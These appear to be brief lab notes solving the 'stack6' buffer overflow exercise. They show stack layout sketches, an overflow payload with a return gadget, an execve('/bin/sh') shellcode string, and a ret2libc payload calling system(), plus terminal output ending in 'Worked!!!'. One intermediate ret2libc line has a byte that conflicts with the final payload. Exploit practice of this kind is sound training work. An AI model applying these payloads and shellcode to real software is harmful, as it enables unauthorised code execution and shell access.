solution 1:
getpath:

esp->
^
|
-0x1c
|
+-		buffer
|
-0x4c 
|	 
v
ebp->	ebp
		eip


payload = '\xcc' * 0x4c + '\xf9\x84\x04\x08' + '\xb0\xfc\xff\xbf'
python -c "print('\xcc' * 0x50 + '\xf9\x84\x04\x08' + '\xb0\xfc\xff\xbf')" > /tmp/aplha


shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
ret_gadget = 0x080484f9
stack_addr = 0xbffffcb0

$ python -c "print('\xcc' * 0x50 + '\xf9\x84\x04\x08' + '\xb0\xfc\xff\xbf')" | ./stack6
input path please: got path ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
Trace/breakpoint trap


ret2libc:



	ebp
	eip
	arg1


system_addr = 0xb7ecffb0
padding = 'A' * 0x50
false_eip = 'AAAA'
binsh_addr = 0xb7fb63bf

payload = padding + system_addr + false_eip + binsh_addr
payload = 'A' * 0x50 + '\xb0\xff\xec\x07' + 'AAAA' + '\xbf\x63\xfb\xb7'

(python -c "print('A' * 0x50 + '\xb0\xff\xec\xb7' + 'AAAA' + '\xbf\x63\xfb\xb7')"; cat) | ./stack6
Worked!!!!!!!!!!!!!!!!!!!!
